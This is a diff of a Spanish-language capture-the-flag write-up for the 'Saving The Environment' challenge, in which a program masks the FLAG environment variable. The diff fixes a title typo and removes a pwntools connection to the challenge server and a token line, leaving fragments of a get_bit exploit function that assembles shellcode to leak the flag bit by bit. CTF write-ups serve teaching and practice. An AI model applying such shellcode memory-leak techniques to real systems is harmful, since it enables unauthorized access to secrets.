@@ -1,4 +1,4 @@
-# Saving The Enviroment
+# Saving The Environment
 
 Este ejercicio nos da un programa que imprime las variables de entorno del usuario que lo ejecute.\
 El usuario que ejecuta el binario en remoto tiene la variable `FLAG=laflag`, donde está la flag que queremos conseguir. Parece que simplemente hay que ejecutar el programa y ya, pero si lo hacemos, donde debería aparecer la flag, saldrá `FLAG=... Lets not print this one...`.  Esto se debe a lo siguiente:
@@ -109,9 +109,7 @@ c
 def get_bit(offset, bit):
     #p = process(exe.path)
     #p = gdb.debug(exe.path, gdbscript)
-    p = remote('saving-environment.challs.snakectf.org', 1337, ssl=True)
 
-    p.sendlineafter(b': ', b'b7d08eecc6eb8942eca8f6eeb379e8a4')
     shellcode = asm(f'''
         mov rdi, [rbp + 0x150]
         xor rax, rax
